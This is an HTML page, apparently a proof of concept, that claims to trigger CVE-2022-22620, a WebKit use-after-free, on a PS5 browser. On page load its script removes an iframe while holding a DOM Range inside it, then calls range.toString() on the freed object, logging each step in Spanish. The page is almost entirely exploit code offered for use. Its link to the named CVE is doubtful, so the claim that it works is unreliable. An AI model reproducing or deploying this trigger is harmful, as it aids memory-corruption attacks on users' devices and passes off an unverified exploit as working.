<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>💥 PS5 PoC - CVE-2022-22620</title>
  <style>
    body { background: black; color: lime; font-family: monospace; padding: 1em; white-space: pre-wrap; }
  </style>
</head>
<body>
  <h1>💥 CVE-2022-22620 PoC (Use-After-Free)</h1>
  <pre id="log">[LOG]\n</pre>

<script>
  const log = document.getElementById("log");
  function print(msg) {
    log.textContent += msg + "\n";
    console.log(msg);
  }

  function triggerUAF() {
    print("[*] Iniciando trigger CVE-2022-22620...");

    let iframe = document.createElement('iframe');
    document.body.appendChild(iframe);

    iframe.contentDocument.open();
    iframe.contentDocument.write("<body><div id='target'>Hello</div></body>");
    iframe.contentDocument.close();

    // Creamos un range sobre el iframe
    let range = iframe.contentDocument.createRange();
    let target = iframe.contentDocument.getElementById('target');

    range.selectNodeContents(target);

    // Removemos el iframe → libera target y range internamente
    document.body.removeChild(iframe);
    print("[+] Iframe eliminado, objeto debería estar liberado");

    // Forzamos reuso del objeto potencialmente liberado
    try {
      let text = range.toString();  // UAF ocurre aquí en versiones vulnerables
      print("[+] range.toString() ejecutado: " + text);
    } catch (e) {
      print("[-] Error al acceder a range: " + e);
    }

    print("[*] Fin del trigger.");
  }

  window.onload = () => {
    setTimeout(triggerUAF, 100);
  };
</script>
</body>
</html>
